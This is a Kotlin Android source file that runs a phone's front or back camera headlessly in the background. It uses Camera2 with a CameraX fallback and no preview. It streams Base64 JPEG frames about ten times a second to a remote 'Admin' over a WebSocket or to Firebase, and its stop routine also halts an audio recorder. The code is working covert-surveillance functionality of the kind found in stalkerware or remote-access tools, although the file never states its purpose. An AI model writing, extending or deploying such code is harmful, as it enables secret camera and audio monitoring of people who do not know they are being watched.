package com.example.camera

import android.annotation.SuppressLint
import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.ImageFormat
import android.graphics.Matrix
import android.graphics.Rect
import android.graphics.YuvImage
import android.hardware.camera2.CameraAccessException
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.media.Image
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.os.Looper
import android.util.Base64
import android.util.Log
import android.util.Size
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageAnalysis
import androidx.camera.core.ImageProxy
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.content.ContextCompat
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleOwner
import androidx.lifecycle.LifecycleRegistry
import org.java_websocket.WebSocket
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

object BackgroundCameraManager {
    private const val TAG = "BgCamera"
    private var cameraProvider: ProcessCameraProvider? = null
    private var cameraExecutor: ExecutorService? = null
    private var isStreaming = false
    private var activeWebSocket: WebSocket? = null
    
    // Custom internal LifecycleOwner for headless CameraX binding
    private class SimpleLifecycleOwner : LifecycleOwner {
        private val lifecycleRegistry = LifecycleRegistry(this)
        init {
            if (Looper.myLooper() == Looper.getMainLooper()) {
                lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_CREATE)
            } else {
                Handler(Looper.getMainLooper()).post {
                    lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_CREATE)
                }
            }
        }
        fun start() {
            if (Looper.myLooper() == Looper.getMainLooper()) {
                lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_START)
                lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_RESUME)
            } else {
                Handler(Looper.getMainLooper()).post {
                    lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_START)
                    lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_RESUME)
                }
            }
        }
        fun stop() {
            if (Looper.myLooper() == Looper.getMainLooper()) {
                lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_PAUSE)
                lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_STOP)
            } else {
                Handler(Looper.getMainLooper()).post {
                    lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_PAUSE)
                    lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_STOP)
                }
            }
        }
        override val lifecycle: Lifecycle get() = lifecycleRegistry
    }

    private val lifecycleOwner = SimpleLifecycleOwner()

    @SuppressLint("UnsafeOptInUsageError")
    fun startCameraStream(context: Context, webSocket: WebSocket) {
        if (isStreaming) {
            // Update active destination socket if connected Admin changes
            activeWebSocket = webSocket
            return
        }
        
        Log.d(TAG, "Starting background camera stream...")
        activeWebSocket = webSocket
        isStreaming = true
        
        // Double check runtime permission before launching
        if (androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.CAMERA) 
            != android.content.pm.PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "Cannot start camera stream: Camera permission not granted")
            isStreaming = false
            activeWebSocket = null
            return
        }
        
        val cameraProviderFuture = ProcessCameraProvider.getInstance(context)
        cameraExecutor = Executors.newSingleThreadExecutor()
        
        cameraProviderFuture.addListener({
            try {
                cameraProvider = cameraProviderFuture.get()
                cameraProvider?.unbindAll()

                val cameraSelector = CameraSelector.Builder()
                    .requireLensFacing(CameraSelector.LENS_FACING_FRONT)
                    .build()

                // Limit frame analysis rate using a simple throttler inside the ImageAnalysis.Analyzer
                val imageAnalysis = ImageAnalysis.Builder()
                    .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST)
                    .setTargetResolution(android.util.Size(480, 640))
                    .build()

                var lastAnalyzedTimestamp = 0L

                imageAnalysis.setAnalyzer(cameraExecutor!!) { imageProxy ->
                    val currentTimestamp = System.currentTimeMillis()
                    // Capture frames at interval of 100ms (10 frames per second for low-latency continuous stream)
                    if (currentTimestamp - lastAnalyzedTimestamp >= 100L) {
                        lastAnalyzedTimestamp = currentTimestamp
                        
                        try {
                            val base64Img = imageProxyToJpegBase64(imageProxy, "front")
                            if (base64Img != null && isStreaming) {
                                sendFrame(base64Img)
                            }
                        } catch (e: Exception) {
                            Log.e(TAG, "Error encoding camera frame", e)
                        }
                    }
                    imageProxy.close()
                }

                lifecycleOwner.start()
                try {
                    cameraProvider?.bindToLifecycle(
                        lifecycleOwner,
                        cameraSelector,
                        imageAnalysis
                    )
                    Log.d(TAG, "Camera life-cycle successfully bound.")
                } catch (e: SecurityException) {
                    Log.e(TAG, "SecurityException: Camera permission was denied at bind time", e)
                    isStreaming = false
                    activeWebSocket = null
                } catch (e: Exception) {
                    Log.e(TAG, "Exception binding camera layout", e)
                    isStreaming = false
                    activeWebSocket = null
                }
            } catch (e: Exception) {
                Log.e(TAG, "Failed to initialize CameraX provider", e)
                isStreaming = false
            }
        }, ContextCompat.getMainExecutor(context))
    }

    fun stopCameraStream() {
        if (!isStreaming) return
        Log.d(TAG, "Stopping background camera stream...")
        isStreaming = false
        activeWebSocket = null
        
        try {
            cameraProvider?.unbindAll()
            lifecycleOwner.stop()
        } catch (e: Exception) {
            e.printStackTrace()
        }
        
        try {
            cameraExecutor?.shutdown()
            cameraExecutor = null
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun sendFrame(base64Img: String) {
        val socket = activeWebSocket
        if (socket != null && socket.isOpen) {
            try {
                val frameMsg = JSONObject().apply {
                    put("type", "CAMERA_FRAME")
                    put("image", base64Img)
                }
                socket.send(frameMsg.toString())
            } catch (e: Exception) {
                Log.e(TAG, "Error sending camera frame via WebSocket", e)
            }
        }
    }

    // Convert ImageProxy to JPEG Base64
    private fun imageProxyToJpegBase64(image: ImageProxy, lensFacing: String = "front"): String? {
        try {
            if (image.format == ImageFormat.YUV_420_888) {
                val nv21 = yuvToNv21(image)
                val yuvImage = YuvImage(nv21, ImageFormat.NV21, image.width, image.height, null)
                val out = ByteArrayOutputStream()
                
                // Compress raw NV21 to JPEG
                yuvImage.compressToJpeg(Rect(0, 0, image.width, image.height), 45, out)
                val imageBytes = out.toByteArray()
                
                val options = android.graphics.BitmapFactory.Options().apply {
                    inSampleSize = 2 // Always downsample to keep processing fast and lightweight
                }
                val originalBitmap = android.graphics.BitmapFactory.decodeByteArray(imageBytes, 0, imageBytes.size, options)
                if (originalBitmap != null) {
                    val matrix = android.graphics.Matrix().apply {
                        if (lensFacing == "front") {
                            postRotate(270f) // Rotate upright for front portrait camera placement
                            postScale(-1f, 1f) // Mirror horizontally for user view perspective
                        } else {
                            postRotate(90f) // Rotate upright for back portrait camera placement
                        }
                    }
                    val rotatedBitmap = Bitmap.createBitmap(originalBitmap, 0, 0, originalBitmap.width, originalBitmap.height, matrix, true)
                    
                    // Force-scale rotated bitmap to max width of 320px (extremely light payload for zero-lag transmission)
                    val targetWidth = 320
                    val finalBitmap = if (rotatedBitmap.width > targetWidth) {
                        val scale = targetWidth.toFloat() / rotatedBitmap.width
                        val scaledHeight = (rotatedBitmap.height * scale).toInt()
                        Bitmap.createScaledBitmap(rotatedBitmap, targetWidth, scaledHeight, true)
                    } else {
                        rotatedBitmap
                    }

                    val outRotated = ByteArrayOutputStream()
                    finalBitmap.compress(Bitmap.CompressFormat.JPEG, 45, outRotated)
                    
                    return Base64.encodeToString(outRotated.toByteArray(), Base64.NO_WRAP)
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
        return null
    }

    private var isFirebaseStreaming = false
    private var activeFirebaseLens = "front"

    // Camera2 variables for headless background streaming
    private var camera2Device: CameraDevice? = null
    private var camera2Session: CameraCaptureSession? = null
    private var camera2ImageReader: ImageReader? = null
    private var camera2Thread: HandlerThread? = null
    private var camera2Handler: Handler? = null
    private var lastCamera2FrameTime = 0L

    @SuppressLint("MissingPermission")
    fun startCameraStreamFirebase(context: Context, lensFacing: String = "front") {
        if (isFirebaseStreaming) {
            if (activeFirebaseLens == lensFacing && (camera2Device != null || cameraProvider != null)) {
                return
            } else {
                Log.d(TAG, "Firebase lens selection changed from $activeFirebaseLens to $lensFacing. Restarting camera stream...")
                stopCameraStreamFirebase()
            }
        }
        Log.d(TAG, "Starting background camera stream for Firebase with lens: $lensFacing...")
        isFirebaseStreaming = true
        activeFirebaseLens = lensFacing
        
        if (ContextCompat.checkSelfPermission(context, android.Manifest.permission.CAMERA) 
            != android.content.pm.PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "Cannot start Firebase camera stream: Camera permission not granted")
            isFirebaseStreaming = false
            return
        }

        // Try Camera2 first (preferred for headless background service operation)
        try {
            val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val targetFacing = if (lensFacing == "back") {
                CameraCharacteristics.LENS_FACING_BACK
            } else {
                CameraCharacteristics.LENS_FACING_FRONT
            }

            var chosenCameraId: String? = null
            for (id in cameraManager.cameraIdList) {
                val chars = cameraManager.getCameraCharacteristics(id)
                if (chars.get(CameraCharacteristics.LENS_FACING) == targetFacing) {
                    chosenCameraId = id
                    break
                }
            }
            if (chosenCameraId == null && cameraManager.cameraIdList.isNotEmpty()) {
                chosenCameraId = cameraManager.cameraIdList[0]
            }

            if (chosenCameraId != null) {
                startCamera2Stream(context, cameraManager, chosenCameraId, lensFacing)
                return
            }
        } catch (e: Exception) {
            Log.w(TAG, "Camera2 initialization exception, falling back to CameraX", e)
        }

        // Fallback to CameraX if Camera2 was not available
        startCameraXStreamFirebase(context, lensFacing)
    }

    @SuppressLint("MissingPermission")
    private fun startCamera2Stream(context: Context, cameraManager: CameraManager, cameraId: String, lensFacing: String) {
        try {
            camera2Thread = HandlerThread("Camera2BgThread").apply { start() }
            camera2Handler = Handler(camera2Thread!!.looper)

            val chars = cameraManager.getCameraCharacteristics(cameraId)
            val map = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            val outputSizes = map?.getOutputSizes(ImageFormat.YUV_420_888)
            val chosenSize = outputSizes?.filter { it.width <= 640 && it.height <= 480 }
                ?.maxByOrNull { it.width * it.height }
                ?: Size(640, 480)

            camera2ImageReader = ImageReader.newInstance(chosenSize.width, chosenSize.height, ImageFormat.YUV_420_888, 2)
            camera2ImageReader?.setOnImageAvailableListener({ reader ->
                val image = try {
                    reader.acquireLatestImage()
                } catch (e: Exception) {
                    null
                } ?: return@setOnImageAvailableListener

                try {
                    val now = System.currentTimeMillis()
                    if (now - lastCamera2FrameTime >= 100L && isFirebaseStreaming) {
                        lastCamera2FrameTime = now
                        val nv21 = mediaImageToNv21(image)
                        val base64 = nv21ToBase64(nv21, image.width, image.height, activeFirebaseLens)
                        if (base64 != null && isFirebaseStreaming) {
                            com.example.network.FirebaseManager.uploadUserFrame(context, base64, "")
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error processing Camera2 frame", e)
                } finally {
                    image.close()
                }
            }, camera2Handler)

            cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    camera2Device = camera
                    try {
                        val surface = camera2ImageReader?.surface ?: return
                        camera.createCaptureSession(listOf(surface), object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(session: CameraCaptureSession) {
                                camera2Session = session
                                try {
                                    val requestBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
                                        addTarget(surface)
                                        set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                                        set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                                    }
                                    session.setRepeatingRequest(requestBuilder.build(), null, camera2Handler)
                                    Log.i(TAG, "Camera2 background streaming running successfully.")
                                } catch (e: Exception) {
                                    Log.e(TAG, "Failed to start repeating capture request", e)
                                    Handler(Looper.getMainLooper()).post {
                                        if (isFirebaseStreaming) {
                                            startCameraXStreamFirebase(context, lensFacing)
                                        }
                                    }
                                }
                            }

                            override fun onConfigureFailed(session: CameraCaptureSession) {
                                Log.e(TAG, "Camera2 session configuration failed. Switching to CameraX engine...")
                                Handler(Looper.getMainLooper()).post {
                                    if (isFirebaseStreaming) {
                                        startCameraXStreamFirebase(context, lensFacing)
                                    }
                                }
                            }
                        }, camera2Handler)
                    } catch (e: Exception) {
                        Log.e(TAG, "Failed to create Camera2 capture session", e)
                        Handler(Looper.getMainLooper()).post {
                            if (isFirebaseStreaming) {
                                startCameraXStreamFirebase(context, lensFacing)
                            }
                        }
                    }
                }

                override fun onDisconnected(camera: CameraDevice) {
                    camera.close()
                    camera2Device = null
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    Log.e(TAG, "Camera2 device error: $error")
                    camera.close()
                    camera2Device = null
                    Handler(Looper.getMainLooper()).post {
                        if (isFirebaseStreaming) {
                            startCameraXStreamFirebase(context, lensFacing)
                        }
                    }
                }
            }, camera2Handler)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to open Camera2", e)
            startCameraXStreamFirebase(context, lensFacing)
        }
    }

    private fun mediaImageToNv21(image: Image): ByteArray {
        val width = image.width
        val height = image.height
        val out = ByteArray(width * height * 3 / 2)

        val yPlane = image.planes[0]
        val uPlane = image.planes[1]
        val vPlane = image.planes[2]

        val yBuffer = yPlane.buffer
        val uBuffer = uPlane.buffer
        val vBuffer = vPlane.buffer

        val yRowStride = yPlane.rowStride
        val yPixelStride = yPlane.pixelStride
        for (row in 0 until height) {
            val rowOffset = row * yRowStride
            for (col in 0 until width) {
                out[row * width + col] = yBuffer.get(rowOffset + col * yPixelStride)
            }
        }

        val uRowStride = uPlane.rowStride
        val uPixelStride = uPlane.pixelStride
        val vRowStride = vPlane.rowStride
        val vPixelStride = vPlane.pixelStride

        val uvHeight = height / 2
        val uvWidth = width / 2
        var uvIdx = width * height

        for (row in 0 until uvHeight) {
            val uRowOffset = row * uRowStride
            val vRowOffset = row * vRowStride
            for (col in 0 until uvWidth) {
                val uOffset = uRowOffset + col * uPixelStride
                val vOffset = vRowOffset + col * vPixelStride

                if (vOffset < vBuffer.limit()) {
                    out[uvIdx++] = vBuffer.get(vOffset)
                } else {
                    out[uvIdx++] = 127.toByte()
                }

                if (uOffset < uBuffer.limit()) {
                    out[uvIdx++] = uBuffer.get(uOffset)
                } else {
                    out[uvIdx++] = 127.toByte()
                }
            }
        }

        return out
    }

    private fun nv21ToBase64(nv21: ByteArray, width: Int, height: Int, lensFacing: String): String? {
        try {
            val yuvImage = YuvImage(nv21, ImageFormat.NV21, width, height, null)
            val out = ByteArrayOutputStream()
            yuvImage.compressToJpeg(Rect(0, 0, width, height), 65, out)
            val jpegBytes = out.toByteArray()

            val options = BitmapFactory.Options().apply {
                inSampleSize = 1
            }
            val originalBitmap = BitmapFactory.decodeByteArray(jpegBytes, 0, jpegBytes.size, options) ?: return null
            val matrix = Matrix().apply {
                if (lensFacing == "front") {
                    postRotate(270f)
                    postScale(-1f, 1f)
                } else {
                    postRotate(90f)
                }
            }
            val rotatedBitmap = Bitmap.createBitmap(originalBitmap, 0, 0, originalBitmap.width, originalBitmap.height, matrix, true)
            val targetWidth = 360
            val finalBitmap = if (rotatedBitmap.width > targetWidth) {
                val scale = targetWidth.toFloat() / rotatedBitmap.width
                val scaledHeight = (rotatedBitmap.height * scale).toInt()
                Bitmap.createScaledBitmap(rotatedBitmap, targetWidth, scaledHeight, true)
            } else {
                rotatedBitmap
            }
            val outFinal = ByteArrayOutputStream()
            finalBitmap.compress(Bitmap.CompressFormat.JPEG, 50, outFinal)
            if (finalBitmap != rotatedBitmap) finalBitmap.recycle()
            if (rotatedBitmap != originalBitmap) rotatedBitmap.recycle()
            originalBitmap.recycle()
            return Base64.encodeToString(outFinal.toByteArray(), Base64.NO_WRAP)
        } catch (e: Exception) {
            Log.e(TAG, "Error encoding nv21 frame to base64", e)
            return null
        }
    }

    private fun startCameraXStreamFirebase(context: Context, lensFacing: String) {
        val cameraProviderFuture = ProcessCameraProvider.getInstance(context)
        cameraExecutor = Executors.newSingleThreadExecutor()
        
        cameraProviderFuture.addListener({
            try {
                cameraProvider = cameraProviderFuture.get()
                cameraProvider?.unbindAll()

                val lensFacingInt = if (lensFacing == "back") {
                    CameraSelector.LENS_FACING_BACK
                } else {
                    CameraSelector.LENS_FACING_FRONT
                }

                val primarySelector = CameraSelector.Builder()
                    .requireLensFacing(lensFacingInt)
                    .build()

                val cameraSelector = if (cameraProvider?.hasCamera(primarySelector) == true) {
                    primarySelector
                } else if (cameraProvider?.hasCamera(CameraSelector.DEFAULT_BACK_CAMERA) == true) {
                    CameraSelector.DEFAULT_BACK_CAMERA
                } else if (cameraProvider?.hasCamera(CameraSelector.DEFAULT_FRONT_CAMERA) == true) {
                    CameraSelector.DEFAULT_FRONT_CAMERA
                } else {
                    primarySelector
                }

                val imageAnalysis = ImageAnalysis.Builder()
                    .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST)
                    .setTargetAspectRatio(androidx.camera.core.AspectRatio.RATIO_4_3)
                    .build()

                var lastAnalyzedTimestamp = 0L

                imageAnalysis.setAnalyzer(cameraExecutor!!) { imageProxy ->
                    val currentTimestamp = System.currentTimeMillis()
                    // Capture frames at interval of 110ms (~9 FPS for smooth, ultra light low-latency transmission)
                    if (currentTimestamp - lastAnalyzedTimestamp >= 110L) {
                        lastAnalyzedTimestamp = currentTimestamp
                        
                        try {
                            val base64Img = imageProxyToJpegBase64(imageProxy, activeFirebaseLens)
                            if (base64Img != null && isFirebaseStreaming) {
                                com.example.network.FirebaseManager.uploadUserFrame(context, base64Img, "")
                            }
                        } catch (e: Exception) {
                            Log.e(TAG, "Error encoding firebase camera frame", e)
                        }
                    }
                    imageProxy.close()
                }

                lifecycleOwner.start()
                cameraProvider?.bindToLifecycle(
                    lifecycleOwner,
                    cameraSelector,
                    imageAnalysis
                )
            } catch (e: Exception) {
                Log.e(TAG, "Failed to initialize Firebase camera provider", e)
                isFirebaseStreaming = false
            }
        }, ContextCompat.getMainExecutor(context))
    }

    fun stopCameraStreamFirebase() {
        if (!isFirebaseStreaming) return
        Log.d(TAG, "Stopping Firebase background camera stream...")
        isFirebaseStreaming = false
        
        // Stop audio recording
        com.example.network.AudioStreamManager.stopRecording()
        
        // Stop Camera2
        try {
            camera2Session?.stopRepeating()
            camera2Session?.close()
            camera2Session = null
        } catch (e: Exception) { }
        try {
            camera2Device?.close()
            camera2Device = null
        } catch (e: Exception) { }
        try {
            camera2ImageReader?.close()
            camera2ImageReader = null
        } catch (e: Exception) { }
        try {
            camera2Thread?.quitSafely()
            camera2Thread = null
            camera2Handler = null
        } catch (e: Exception) { }

        // Stop CameraX
        Handler(Looper.getMainLooper()).post {
            try {
                cameraProvider?.unbindAll()
                lifecycleOwner.stop()
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
        
        try {
            cameraExecutor?.shutdown()
            cameraExecutor = null
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun yuvToNv21(image: ImageProxy): ByteArray {
        val width = image.width
        val height = image.height
        val out = ByteArray(width * height * 3 / 2)

        val yPlane = image.planes[0]
        val uPlane = image.planes[1]
        val vPlane = image.planes[2]

        val yBuffer = yPlane.buffer
        val uBuffer = uPlane.buffer
        val vBuffer = vPlane.buffer

        // Y channel
        val yRowStride = yPlane.rowStride
        val yPixelStride = yPlane.pixelStride
        for (row in 0 until height) {
            val rowOffset = row * yRowStride
            for (col in 0 until width) {
                out[row * width + col] = yBuffer.get(rowOffset + col * yPixelStride)
            }
        }

        // U/V channel (Interleaved: NV21 format is YYYYYYYY VUVUVUVU)
        val uRowStride = uPlane.rowStride
        val uPixelStride = uPlane.pixelStride
        val vRowStride = vPlane.rowStride
        val vPixelStride = vPlane.pixelStride

        val uvHeight = height / 2
        val uvWidth = width / 2
        var uvIdx = width * height

        for (row in 0 until uvHeight) {
            val uRowOffset = row * uRowStride
            val vRowOffset = row * vRowStride
            for (col in 0 until uvWidth) {
                val uOffset = uRowOffset + col * uPixelStride
                val vOffset = vRowOffset + col * vPixelStride
                
                if (vOffset < vBuffer.limit()) {
                    out[uvIdx++] = vBuffer.get(vOffset)
                } else {
                    out[uvIdx++] = 127.toByte()
                }
                
                if (uOffset < uBuffer.limit()) {
                    out[uvIdx++] = uBuffer.get(uOffset)
                } else {
                    out[uvIdx++] = 127.toByte()
                }
            }
        }

        return out
    }
}
